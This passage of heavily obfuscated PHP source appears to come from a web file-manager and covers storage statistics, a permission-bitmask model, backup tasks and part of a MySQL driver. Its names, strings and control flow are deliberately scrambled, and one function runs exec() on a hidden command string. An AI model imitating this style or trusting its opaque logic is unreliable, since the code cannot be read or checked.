Model($cØÁ»Á£Ò[759])->where(array($cØÁ»Á£Ò[386] => 0))->count($cØÁ»Á£Ò[385]); $A­Œöã¹›¸ = array($cØÁ»Á£Ò[386] => 0, $cØÁ»Á£Ò[190] => array($cØÁ»Á£Ò[936], strtotime(date($cØÁ»Á£Ò[1587])))); goto EõºÅ’Àíä; EõºÅ’Àíä: $Eˆ³ò¼¥õ = Model($cØÁ»Á£Ò[759])->where($A­Œöã¹›¸)->sum($cØÁ»Á£Ò[77]); $C‰é…«î§» = Model($cØÁ»Á£Ò[759])->where($A­Œöã¹›¸)->count($cØÁ»Á£Ò[385]); return array($cØÁ»Á£Ò[706] => $cÙÔÔä‹Î, $cØÁ»Á£Ò[1580] => $DÏšªöÎ Î, $cØÁ»Á£Ò[1613] => $cÙÔÔä‹Î - $DÏšªöÎ Î, $cØÁ»Á£Ò[1614] => (int) $Eˆ³ò¼¥õ, $cØÁ»Á£Ò[708] => (int) $fäƒäôƒ¬, $cØÁ»Á£Ò[1615] => (int) $C‰é…«î§»); goto F¡Ìé¡“¢ª; E‰³‰Æ•Ü°: $cØÁ»Á£Ò =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $dº´ì§› » = $this->sourceSize(); $cÙÔÔä‹Î = $dº´ì§› »[$cØÁ»Á£Ò[77]]; goto bƒó‹’îƒª; F¡Ìé¡“¢ª: } private function optionAccess() { $CóÚƒ†ÎÈì =& $_SERVER[ÈİÅ¿ÈÈ¥×]; return array($CóÚƒ†ÎÈì[703] => $this->typeLogCnt(), $CóÚƒ†ÎÈì[103] => $this->typeLogCnt($CóÚƒ†ÎÈì[103]), $CóÚƒ†ÎÈì[420] => $this->typeLogCnt($CóÚƒ†ÎÈì[420]), $CóÚƒ†ÎÈì[1616] => $this->typeLogCnt($CóÚƒ†ÎÈì[1616]), $CóÚƒ†ÎÈì[1617] => $this->typeLogCnt($CóÚƒ†ÎÈì[1617]), $CóÚƒ†ÎÈì[551] => $this->typeLogCnt($CóÚƒ†ÎÈì[33], $CóÚƒ†ÎÈì[1591])); } private function typeLogCnt($F¤«ÜÍ›±õ = '', $cìÀ¨õôäÈ = "\x69\144") { goto c“Û·â‰µ; c“Û·â‰µ: $b©Ğ†‚©´´ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $a­ÑåõÕÁ = array($b©Ğ†‚©´´[103] => array($b©Ğ†‚©´´[1618], $b©Ğ†‚©´´[1619]), $b©Ğ†‚©´´[420] => array($b©Ğ†‚©´´[1620], $b©Ğ†‚©´´[1621]), $b©Ğ†‚©´´[1616] => array($b©Ğ†‚©´´[1622], $b©Ğ†‚©´´[1623], $b©Ğ†‚©´´[1624]), $b©Ğ†‚©´´[1617] => array($b©Ğ†‚©´´[1625], $b©Ğ†‚©´´[1626]), $b©Ğ†‚©´´[1627] => array($b©Ğ†‚©´´[1628], $b©Ğ†‚©´´[1629], $b©Ğ†‚©´´[1630])); $Bå»„Ü¦ğî = strtotime(date($b©Ğ†‚©´´[1587])); goto e²„ã¸»±À; Bí¦ë–…¼: return (int) $bÕÛ¯â‘ˆÒ; goto Eµïé‹”Úƒ; e²„ã¸»±À: $C²ÓÓÈ•íì = array($b©Ğ†‚©´´[190] => array($b©Ğ†‚©´´[936], $Bå»„Ü¦ğî)); if ($F¤«ÜÍ›±õ) { $C²ÓÓÈ•íì[$b©Ğ†‚©´´[29]] = array($b©Ğ†‚©´´[7], $a­ÑåõÕÁ[$F¤«ÜÍ›±õ]); } $bÕÛ¯â‘ˆÒ = Model($b©Ğ†‚©´´[1590])->where($C²ÓÓÈ•íì)->count($cìÀ¨õôäÈ); goto Bí¦ë–…¼; Eµïé‹”Úƒ: } private function optionServer() { goto Aá‹ˆÊÍ; Eáä¹Ğœ±°: $dì¶©éÛÉã = array($F†¹·ÀŸ‚â[751] => $a³‰Ø‹§‡Õ[$F†¹·ÀŸ‚â[383]]); $dÚ‰»ÎåÙÅ = Model($F†¹·ÀŸ‚â[438])->where($dì¶©éÛÉã)->sum($F†¹·ÀŸ‚â[77]); $e“ô–À„Ÿ = explode($F†¹·ÀŸ‚â[50], $_SERVER[$F†¹·ÀŸ‚â[139]]); goto eŸ‘¢¡ÚÎ¦; Bœ½œç¡»: return array($F†¹·ÀŸ‚â[1633] => $AĞ‰ÛƒîèÂ ? $AĞ‰ÛƒîèÂ[$F†¹·ÀŸ‚â[1634]] : 0, $F†¹·ÀŸ‚â[1635] => $AĞ‰ÛƒîèÂ ? $AĞ‰ÛƒîèÂ[$F†¹·ÀŸ‚â[1636]] : 0, $F†¹·ÀŸ‚â[1637] => (int) $a³‰Ø‹§‡Õ[$F†¹·ÀŸ‚â[1634]] * 1024 * 1024 * 1024, $F†¹·ÀŸ‚â[1638] => (int) $dÚ‰»ÎåÙÅ, $F†¹·ÀŸ‚â[1639] => ucfirst($C†ÇÔáµÙ—), $F†¹·ÀŸ‚â[1640] => $F†¹·ÀŸ‚â[1641] . PHP_VERSION, $F†¹·ÀŸ‚â[1642] => phpBuild64() ? 64 : 32, $F†¹·ÀŸ‚â[702] => str_replace($F†¹·ÀŸ‚â[1643], $F†¹·ÀŸ‚â[913], $cŠÙ“˜ª­), $F†¹·ÀŸ‚â[343] => ucfirst($b£áˆÙ¬ƒ®), $F†¹·ÀŸ‚â[28] => $_SERVER[$F†¹·ÀŸ‚â[1644]]); goto bŞÂ„¢‰Ä; D±¢¹‘¢Ú: if ($cŠÙ“˜ª­ == $F†¹·ÀŸ‚â[731]) { $cÁ†Œ¾Õ‰ = explode($F†¹·ÀŸ‚â[1127], $aÓšĞ„æ«á[$F†¹·ÀŸ‚â[896]]); $cŠÙ“˜ª­ = $cÁ†Œ¾Õ‰[0]; } if ($cŠÙ“˜ª­ == $F†¹·ÀŸ‚â[734] || $cŠÙ“˜ª­ == $F†¹·ÀŸ‚â[735]) { $CĞ·Ïù˜… = Model()->db()->query($F†¹·ÀŸ‚â[1631]); $açŠ²èÍƒƒ = $CĞ·Ïù˜…[0] && isset($CĞ·Ïù˜…[0][$F†¹·ÀŸ‚â[1394]]) ? $CĞ·Ïù˜…[0][$F†¹·ÀŸ‚â[1394]] : 0; $cŠÙ“˜ª­ = $F†¹·ÀŸ‚â[1632] . ($açŠ²èÍƒƒ ? $F†¹·ÀŸ‚â[8] . $açŠ²èÍƒƒ : $F†¹·ÀŸ‚â[33]); } $b£áˆÙ¬ƒ® = $GLOBALS[$F†¹·ÀŸ‚â[6]][$F†¹·ÀŸ‚â[343]][$F†¹·ÀŸ‚â[761]]; goto Bœ½œç¡»; Aá‹ˆÊÍ: $F†¹·ÀŸ‚â =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $AĞ‰ÛƒîèÂ = $this->diskDriver(); $a³‰Ø‹§‡Õ = KodIO::defaultDriver(); goto Eáä¹Ğœ±°; eŸ‘¢¡ÚÎ¦: $C†ÇÔáµÙ— = $e“ô–À„Ÿ[0]; $aÓšĞ„æ«á = $GLOBALS[$F†¹·ÀŸ‚â[6]][$F†¹·ÀŸ‚â[17]]; $cŠÙ“˜ª­ = $aÓšĞ„æ«á[$F†¹·ÀŸ‚â[897]]; goto D±¢¹‘¢Ú; bŞÂ„¢‰Ä: } private function diskDriver() { goto A®§„‘ó–ç; E †§óÚ: if ($Bªƒé÷»Õ“) { $bÎŒºç•öä = $B¥Šó¥ìõù[1647]; if (function_exists($B¥Šó¥ìõù[1648])) { exec($B¥Šó¥ìõù[1649], $FŒ–êö¶ŒÅ); $bÎŒºç•öä = $FŒ–êö¶ŒÅ[1] . $B¥Šó¥ìõù[8]; } } if (!file_exists($bÎŒºç•öä)) { return; } $dÓ³ù×µÂï = @disk_total_space($bÎŒºç•öä); goto AÉ§Œµ¦Ç¨; AÉ§Œµ¦Ç¨: $a£ÃƒƒÌÒ = $dÓ³ù×µÂï - @disk_free_space($bÎŒºç•öä); return array($B¥Šó¥ìõù[1634] => $dÓ³ù×µÂï, $B¥Šó¥ìõù[1636] => $a£ÃƒƒÌÒ); goto cŞ„Æ¤áó­; A®§„‘ó–ç: $B¥Šó¥ìõù =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $bÎŒºç•öä = $B¥Šó¥ìõù[8]; $Bªƒé÷»Õ“ = $GLOBALS[$B¥Šó¥ìõù[6]][$B¥Šó¥ìõù[1645]] == $B¥Šó¥ìõù[1646]; goto E †§óÚ; cŞ„Æ¤áó­: } public function fileChart($a¼ŞªË»•¸) { goto c“êàÏë¯®; C¾‰Î—çà: $FÍñ›Ñğ¥¿ = $this->sourceSize(); $AÍ‡Õ©â› = array($eÒĞë˜‘Ÿ·[478] => 0, $eÒĞë˜‘Ÿ·[387] => 1); $d‡Ê›‹ïâ = Model($eÒĞë˜‘Ÿ·[759])->where($AÍ‡Õ©â›)->sum($eÒĞë˜‘Ÿ·[77]); goto E»Î®‹ˆ–½; c“êàÏë¯®: $eÒĞë˜‘Ÿ· =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (isset($a¼ŞªË»•¸[$eÒĞë˜‘Ÿ·[1490]])) { return Model($eÒĞë˜‘Ÿ·[759])->userFileTypeProfile($a¼ŞªË»•¸[$eÒĞë˜‘Ÿ·[1490]]); } if (isset($a¼ŞªË»•¸[$eÒĞë˜‘Ÿ·[1650]])) { return Model($eÒĞë˜‘Ÿ·[759])->groupFileTypeProfile($a¼ŞªË»•¸[$eÒĞë˜‘Ÿ·[1650]]); } goto C¾‰Î—çà; E»Î®‹ˆ–½: $AÍ‡Õ©â›[$eÒĞë˜‘Ÿ·[387]] = 2; $aİš¼Ë¥™Ø = Model($eÒĞë˜‘Ÿ·[759])->where($AÍ‡Õ©â›)->sum($eÒĞë˜‘Ÿ·[77]); return array($eÒĞë˜‘Ÿ·[706] => $FÍñ›Ñğ¥¿[$eÒĞë˜‘Ÿ·[77]], $eÒĞë˜‘Ÿ·[1580] => $FÍñ›Ñğ¥¿[$eÒĞë˜‘Ÿ·[1580]], $eÒĞë˜‘Ÿ·[1581] => (int) $d‡Ê›‹ïâ, $eÒĞë˜‘Ÿ·[1582] => (int) $aİš¼Ë¥™Ø); goto Fãâ¬¤Š¯; Fãâ¬¤Š¯: } private function sourceSize() { $D‘ÉÌ†åˆö =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $A¹‘†™áì = Model($D‘ÉÌ†åˆö[759])->where(array($D‘ÉÌ†åˆö[386] => 0))->sum($D‘ÉÌ†åˆö[77]); $FîÜ·´ª¯ä = Model($D‘ÉÌ†åˆö[438])->sum($D‘ÉÌ†åˆö[77]); if ($FîÜ·´ª¯ä > $A¹‘†™áì) { $FîÜ·´ª¯ä = $A¹‘†™áì; } return array($D‘ÉÌ†åˆö[77] => (int) $A¹‘†™áì, $D‘ÉÌ†åˆö[1580] => (int) $FîÜ·´ª¯ä); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $cö£´©åË“ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $dñË¾ÛëÅ˜ = array(array($cö£´©åË“[402] => LNG($cö£´©åË“[1651]), $cö£´©åË“[1652] => $cö£´©åË“[1653], $cö£´©åË“[1654] => 1, $cö£´©åË“[1655] => 1, $cö£´©åË“[1656] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($cö£´©åË“[402] => LNG($cö£´©åË“[1657]), $cö£´©åË“[1652] => $cö£´©åË“[1658], $cö£´©åË“[1654] => 2, $cö£´©åË“[1655] => 1, $cö£´©åË“[1656] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($cö£´©åË“[402] => LNG($cö£´©åË“[1659]), $cö£´©åË“[1652] => $cö£´©åË“[1660], $cö£´©åË“[1654] => 3, $cö£´©åË“[1655] => 1, $cö£´©åË“[1656] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($cö£´©åË“[402] => LNG($cö£´©åË“[1661]), $cö£´©åË“[1652] => $cö£´©åË“[1662], $cö£´©åË“[1654] => 4, $cö£´©åË“[1655] => 1, $cö£´©åË“[1656] => self::AUTH_SHOW | self::AUTH_VIEW), array($cö£´©åË“[402] => LNG($cö£´©åË“[1663]), $cö£´©åË“[1652] => $cö£´©åË“[1664], $cö£´©åË“[1654] => 5, $cö£´©åË“[1655] => 1, $cö£´©åË“[1656] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($cö£´©åË“[402] => LNG($cö£´©åË“[1665]), $cö£´©åË“[1652] => $cö£´©åË“[1666], $cö£´©åË“[1654] => 6, $cö£´©åË“[1655] => 1, $cö£´©åË“[1656] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($cö£´©åË“[402] => LNG($cö£´©åË“[1667]), $cö£´©åË“[1652] => $cö£´©åË“[1668], $cö£´©åË“[1654] => 7, $cö£´©åË“[1655] => 1, $cö£´©åË“[1656] => 0)); return $dñË¾ÛëÅ˜; } public static function authCheck($aØ½­Ä¾Æ, $bÑ“œÕù³“) { $aØ½­Ä¾Æ = intval($aØ½­Ä¾Æ); if (_get($GLOBALS, $_SERVER[ÈİÅ¿ÈÈ¥×][474])) { return !0; } if ($aØ½­Ä¾Æ <= 0) { return !1; } if (($aØ½­Ä¾Æ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($aØ½­Ä¾Æ & $bÑ“œÕù³“); } public static function authCheckShow($D“Ù—‰³…ù) { return self::authCheck($D“Ù—‰³…ù, self::AUTH_SHOW); } public static function authCheckView($D©î£º¤ä°) { return self::authCheck($D©î£º¤ä°, self::AUTH_VIEW); } public static function authCheckDownload($d»İ§¹°“‡) { return self::authCheck($d»İ§¹°“‡, self::AUTH_DOWNLOAD); } public static function authCheckUpload($c§ãöÕÉâ‰) { return self::authCheck($c§ãöÕÉâ‰, self::AUTH_UPLOAD); } public static function authCheckEdit($AÀ˜Åœ»») { return self::authCheck($AÀ˜Åœ»», self::AUTH_EDIT); } public static function authCheckRemove($A“ÁÓ¾‚“) { return self::authCheck($A“ÁÓ¾‚“, self::AUTH_REMOVE); } public static function authCheckShare($C­àÈ´½“©) { return self::authCheck($C­àÈ´½“©, self::AUTH_SHARE); } public static function authCheckComment($eÙ„ó¹éˆ£) { return self::authCheck($eÙ„ó¹éˆ£, self::AUTH_COMMENT); } public static function authCheckEvent($dÃš»¼Üï) { return self::authCheck($dÃš»¼Üï, self::AUTH_EVENT); } public static function authCheckRoot($Dô’Ä¥ã¯˜) { return self::authCheck($Dô’Ä¥ã¯˜, self::AUTH_ROOT); } public static function authCheckAction($DÓª´‚˜ù‹, $a­‹«äÚ»ğ) { goto bÙ¤¼áÓêí; bÙ¤¼áÓêí: $B‡ˆìË‡¸“ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eáÁÉ¦¦Ü£ = array($B‡ˆìË‡¸“[1669] => self::AUTH_VIEW, $B‡ˆìË‡¸“[1058] => self::AUTH_DOWNLOAD, $B‡ˆìË‡¸“[103] => self::AUTH_UPLOAD, $B‡ˆìË‡¸“[1617] => self::AUTH_EDIT, $B‡ˆìË‡¸“[1616] => self::AUTH_REMOVE, $B‡ˆìË‡¸“[1627] => self::AUTH_SHARE, $B‡ˆìË‡¸“[348] => self::AUTH_COMMENT, $B‡ˆìË‡¸“[1479] => self::AUTH_EVENT, $B‡ˆìË‡¸“[1670] => self::AUTH_ROOT); if (!isset($eáÁÉ¦¦Ü£[$a­‹«äÚ»ğ])) { return; } goto B²ŞŠøãÂÈ; B²ŞŠøãÂÈ: $d“©µø¤¬ = $eáÁÉ¦¦Ü£[$a­‹«äÚ»ğ]; $DÓª´‚˜ù‹ = intval($DÓª´‚˜ù‹); if ($DÓª´‚˜ù‹ <= 0) { return !1; } goto f²à“íÄ­Ã; f²à“íÄ­Ã: if (($DÓª´‚˜ù‹ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($DÓª´‚˜ù‹ & $d“©µø¤¬); goto c‰õ¤³ìÓ; c‰õ¤³ìÓ: } public static function authDisable($fìØÛ“–”ß, $DæÅÛŞ§Œ) { if (intval($fìØÛ“–”ß) <= 0) { return 0; } return intval($fìØÛ“–”ß) & ~$DæÅÛŞ§Œ; } public $optionType = "\123\171\163\x74\145\155\x2e\x73\x6f\165\x72\x63\x65\x41\165\x74\x68\x4c\151\163\164"; public $field = array("\x6e\x61\x6d\x65", "\x61\165\x74\x68", "\154\x61\142\145\154", "\144\151\163\160\154\x61\x79", "\163\x79\x73\164\x65\155", "\x73\157\162\164"); public function initData() { $Fé¨‰¼ì…ª = $this->authDefault(); foreach ($Fé¨‰¼ì…ª as $B‰ÍŠôº¾¥) { $this->add($B‰ÍŠôº¾¥); } } public function listData($d©äÕ£óá = false, $e©Çµ–ª¦• = "\163\157\x72\164", $F¡«¬ÊÅáô = false) { return parent::listData($d©äÕ£óá, $e©Çµ–ª¦•, $F¡«¬ÊÅáô); } public function update($fù±š¾, $A¥Ù£ãëÇ) { $CµÄ†­Â¡ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $fÒ»îÌ—æ = parent::listData($fù±š¾); $E”Ä‰–‘ÇÑ = $this->findByName($A¥Ù£ãëÇ[$CµÄ†­Â¡[28]]); if (!$fÒ»îÌ—æ || $E”Ä‰–‘ÇÑ && $E”Ä‰–‘ÇÑ[$CµÄ†­Â¡[383]] != $fÒ»îÌ—æ[$CµÄ†­Â¡[383]]) { return !1; } $this->filterAuth($A¥Ù£ãëÇ[$CµÄ†­Â¡[392]]); return parent::update($fù±š¾, $A¥Ù£ãëÇ); } public function remove($EÆòÊŞ½¤½) { $Eá£öëÍ†ö = parent::listData($EÆòÊŞ½¤½); if (!$Eá£öëÍ†ö || $Eá£öëÍ†ö[$_SERVER[ÈİÅ¿ÈÈ¥×][1131]]) { return !1; } return parent::remove($EÆòÊŞ½¤½); } public function add($AˆËâ‡ãçÃ = array()) { goto bŞµÄ‹‹; aî÷œëŞÚÃ: $AˆËâ‡ãçÃ = array_merge($b³Ãõ‚ãë‹, $AˆËâ‡ãçÃ); $AˆËâ‡ãçÃ[$dÁƒê®°ò¤[1673]] = $this->getSort(); $this->filterAuth($AˆËâ‡ãçÃ[$dÁƒê®°ò¤[392]]); goto Aô¨»¸äœô; bŞµÄ‹‹: $dÁƒê®°ò¤ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($this->findByName($AˆËâ‡ãçÃ[$dÁƒê®°ò¤[28]])) { return !1; } $b³Ãõ‚ãë‹ = array($dÁƒê®°ò¤[28] => $dÁƒê®°ò¤[33], $dÁƒê®°ò¤[392] => 1, $dÁƒê®°ò¤[1671] => $dÁƒê®°ò¤[1660], $dÁƒê®°ò¤[1672] => 1, $dÁƒê®°ò¤[1131] => 0, $dÁƒê®°ò¤[1673] => 0); goto aî÷œëŞÚÃ; Aô¨»¸äœô: return parent::insert($AˆËâ‡ãçÃ); goto EÃÓ³âİÂ; EÃÓ³âİÂ: } private function getSort() { $aáš¹¥…©­ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Cí¨ô“Õ¡ = parent::listData(); $fáëÓğÅŒ = array_to_keyvalue($Cí¨ô“Õ¡, $aáš¹¥…©­[33], $aáš¹¥…©­[1673]); return empty($fáëÓğÅŒ) ? 0 : max($fáëÓğÅŒ) + 1; } private function filterAuth(&$C–Ø‡©Úø…) { goto cã›™Ì¿“Ú; cäÆÃá¨: foreach ($e±ĞÕƒ†¥ as $Eò”ò…¶) { if (isset($d¯Úš‚ïäî[$Eò”ò…¶])) { $e±ĞÕƒ†¥ = array_merge($e±ĞÕƒ†¥, $d¯Úš‚ïäî[$Eò”ò…¶]); } } $e±ĞÕƒ†¥[] = self::AUTH_SHOW; $C–Ø‡©Úø… = array_sum(array_unique($e±ĞÕƒ†¥)); goto d¦ëÑƒà½Ÿ; a„¥«¶¯åÓ: foreach ($aÓÇéÊí˜ as $Eò”ò…¶) { if ($C–Ø‡©Úø… & $Eò”ò…¶) { $e±ĞÕƒ†¥[] = $Eò”ò…¶; } } if (in_array(self::AUTH_ROOT, $e±ĞÕƒ†¥)) { $C–Ø‡©Úø… = array_sum($aÓÇéÊí˜); return; } $d¯Úš‚ïäî = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto cäÆÃá¨; cã›™Ì¿“Ú: if (!$C–Ø‡©Úø…) { return; } $aÓÇéÊí˜ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $e±ĞÕƒ†¥ = array(); goto a„¥«¶¯åÓ; d¦ëÑƒà½Ÿ: } public function sort($BâÚ‚Şôææ, $d„ŠšŒ¤ğò) { return parent::update($BâÚ‚Şôææ, $d„ŠšŒ¤ğò); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\x2e\x62\x61\143\x6b\165\160\114\151\x73\164"; public $field = array("\151\157", "\x6e\141\155\x65", "\x73\164\141\x74\165\x73", "\x63\x6f\156\x74\145\156\164", "\162\x65\163\165\x6c\x74", "\x74\151\155\x65\106\162\157\155", "\x74\x69\x6d\145\124\x6f"); public function config() { goto eê«¿©ìæƒ; d•®‚•¹Œ: Action($F‹×Ñ”‘« [1674])->taskInit(); $FÆŞ»ˆ„‹ = Model($F‹×Ñ”‘« [1675])->listData(); foreach ($FÆŞ»ˆ„‹ as $eíÄ¬¶©¢®) { if ($eíÄ¬¶©¢®[$F‹×Ñ”‘« [1131]] == $F‹×Ñ”‘« [83] && $eíÄ¬¶©¢®[$F‹×Ñ”‘« [1479]] == $F‹×Ñ”‘« [1676]) { $CğîÅ¯ÌãÙ = $eíÄ¬¶©¢®; break; } } goto fòÏƒ³ã¤½; fòÏƒ³ã¤½: if (isset($CğîÅ¯ÌãÙ[$F‹×Ñ”‘« [193]])) { $CğîÅ¯ÌãÙ[$F‹×Ñ”‘« [193]] = json_decode($CğîÅ¯ÌãÙ[$F‹×Ñ”‘« [193]], !0); } if (isset($B‰Æó¦ğ³î[$F‹×Ñ”‘« [193]])) { $CğîÅ¯ÌãÙ[$F‹×Ñ”‘« [193]][$F‹×Ñ”‘« [1464]] = $B‰Æó¦ğ³î[$F‹×Ñ”‘« [193]]; unset($B‰Æó¦ğ³î[$F‹×Ñ”‘« [193]]); } return array_merge($CğîÅ¯ÌãÙ, $B‰Æó¦ğ³î); goto B ãœÎ†¯Ó; E¦ĞÅÁªíÚ: $B‰Æó¦ğ³î = is_array($B‰Æó¦ğ³î) ? $B‰Æó¦ğ³î : array(); if (!isset($B‰Æó¦ğ³î[$F‹×Ñ”‘« [700]])) { $B‰Æó¦ğ³î[$F‹×Ñ”‘« [700]] = $F‹×Ñ”‘« [83]; } $CğîÅ¯ÌãÙ = array(); goto d•®‚•¹Œ; eê«¿©ìæƒ: $F‹×Ñ”‘«  =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $B‰Æó¦ğ³î = Model($F‹×Ñ”‘« [1087])->get($F‹×Ñ”‘« [721]); $B‰Æó¦ğ³î = json_decode($B‰Æó¦ğ³î, !0); goto E¦ĞÅÁªíÚ; B ãœÎ†¯Ó: } public function listData($c‚½õö½ğØ = false, $fÙÔÛ†’Õ = "\155\x6f\x64\x69\x66\x79\x54\x69\x6d\x65", $b†™Ğî„ = false) { return parent::listData($c‚½õö½ğØ, $fÙÔÛ†’Õ, !0); } public function lastItem() { $dºê¤ÉÒá = $this->listData(); return !empty($dºê¤ÉÒá[0]) ? $dºê¤ÉÒá[0] : null; } public function kill($F¢š‹ª¾î¬) { goto fÒÙåˆÒ­Ê; C³¸·Ç‰ù¼: Task::kill($EĞ¬‰ö´ [720]); Task::kill($EĞ¬‰ö´ [737]); Task::kill($EĞ¬‰ö´ [744]); goto b¯ó²À†Ë; aòÒÇÁ±éÒ: return $this->remove($F¢š‹ª¾î¬); goto eµ‘¢ ×™›; fÒÙåˆÒ­Ê: $EĞ¬‰ö´  =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $A¦Ë ¾î³ = $this->listData($F¢š‹ª¾î¬); if (!$A¦Ë ¾î³ || empty($A¦Ë ¾î³[$EĞ¬‰ö´ [28]])) { return !0; } goto C³¸·Ç‰ù¼; b¯ó²À†Ë: $cÏ£ÔÎ‹×ˆ = $A¦Ë ¾î³[$EĞ¬‰ö´ [28]]; $a»Ÿ£æ«¿² = TEMP_FILES . $EĞ¬‰ö´ [717] . $cÏ£ÔÎ‹×ˆ . $EĞ¬‰ö´ [8]; IO::remove($a»Ÿ£æ«¿², !1); goto aòÒÇÁ±éÒ; eµ‘¢ ×™›: } public function remove($eˆÜ¸¿ñºä) { $aœÔÍ­Œï = $this->listData($eˆÜ¸¿ñºä); if (!$aœÔÍ­Œï) { return !0; } return $this->backupRemove($aœÔÍ­Œï); } private function backupRemove($B”¦³•Ã…) { $DÀŒ˜Ï°Å =& $_SERVER[ÈİÅ¿ÈÈ¥×]; parent::remove($B”¦³•Ã…[$DÀŒ˜Ï°Å[383]]); $AÃ°±óÛ°¨ = "\173\x69\157\72{$B”¦³•Ã…[$DÀŒ˜Ï°Å[699]]}\175\57\144\141\164\x61\x62\x61\163\x65\x2f\142\x61\x63\153\165\160\x5f" . $B”¦³•Ã…[$DÀŒ˜Ï°Å[28]]; IO::remove($AÃ°±óÛ°¨, !1); return !0; } public function start() { goto a³Ç‚†›ßÁ; cƒšİÇë¾Ï: if ($d’Ç”É„”Û) { $d’Ç”É„”Û = $C«”Èª¤Ì½->dbFile(); if ($d’Ç”É„”Û && $a¥Œ‚ŠÍë‘[$dòô±£[700]] == $dòô±£[485]) { $d’Ç”É„”Û = $C«”Èª¤Ì½->file(); } } Backup::set(array($dòô±£[697] => 1, $dòô±£[464] => time())); return !0; goto b®º „“; fµ…ç˜‘ÆÏ: if (!$a¥Œ‚ŠÍë‘ || $a¥Œ‚ŠÍë‘[$dòô±£[1461]] != $dòô±£[83]) { return !1; } $bàÄáƒ·¯× = $this->process(); foreach ($bàÄáƒ·¯× as $eÉ‚Œ²èšõ) { if ($eÉ‚Œ²èšõ) { return Task::restart($eÉ‚Œ²èšõ[$dòô±£[383]]); } } goto e¿„´†½¾å; a³Ç‚†›ßÁ: $dòô±£ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($GLOBALS[$dòô±£[6]][$dòô±£[84]][$dòô±£[1677]] != $dòô±£[83]) { return !0; } $a¥Œ‚ŠÍë‘ = $this->config(); goto fµ…ç˜‘ÆÏ; e¿„´†½¾å: $C«”Èª¤Ì½ = new Backup(); $C«”Èª¤Ì½->keep(); $d’Ç”É„”Û = $C«”Èª¤Ì½->db(); goto cƒšİÇë¾Ï; b®º „“: } public function process() { $fÅ÷Ç¹¿³° =& $_SERVER[ÈİÅ¿ÈÈ¥×]; return array($fÅ÷Ç¹¿³°[702] => Task::get($fÅ÷Ç¹¿³°[720]), $fÅ÷Ç¹¿³°[705] => Task::get($fÅ÷Ç¹¿³°[737]), $fÅ÷Ç¹¿³°[171] => Task::get($fÅ÷Ç¹¿³°[744])); } public function restore() { $cï¿„…êòÎ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; ActionCall($cï¿„…êòÎ[983], !0, 1); ActionCall($cï¿„…êòÎ[983], !0, 0); } } goto fó®“‘Æ; CôÁ«Û­¢’: class DbMysql extends Db { public function __construct($cÕº½ˆ¼· = '') { $ağŒÂ·ò—Î =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!extension_loaded($ağŒÂ·ò—Î[735])) { think_exception(think_lang($ağŒÂ·ò—Î[10]) . $ağŒÂ·ò—Î[810]); } if (!empty($cÕº½ˆ¼·)) { $this->config = $cÕº½ˆ¼·; if (empty($this->config[$ağŒÂ·ò—Î[13]])) { $this->config[$ağŒÂ·ò—Î[13]] = $ağŒÂ·ò—Î[33]; } } } public function connect($D«ù…Ëà¢ = '', $FªÜ‹˜Ò = 0, $aÊìˆÖç³ì = false) { $b°óîÍâÀé =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!isset($this->linkID[$FªÜ‹˜Ò])) { goto Aæ†…¥é†—; Dçïî·ï: mysql_query($b°óîÍâÀé[815] . think_config($b°óîÍâÀé[816]) . $b°óîÍâÀé[55], $this->linkID[$FªÜ‹˜Ò]); if ($DÜºñÄßäÒ > $b°óîÍâÀé[817]) { mysql_query($b°óîÍâÀé[818], 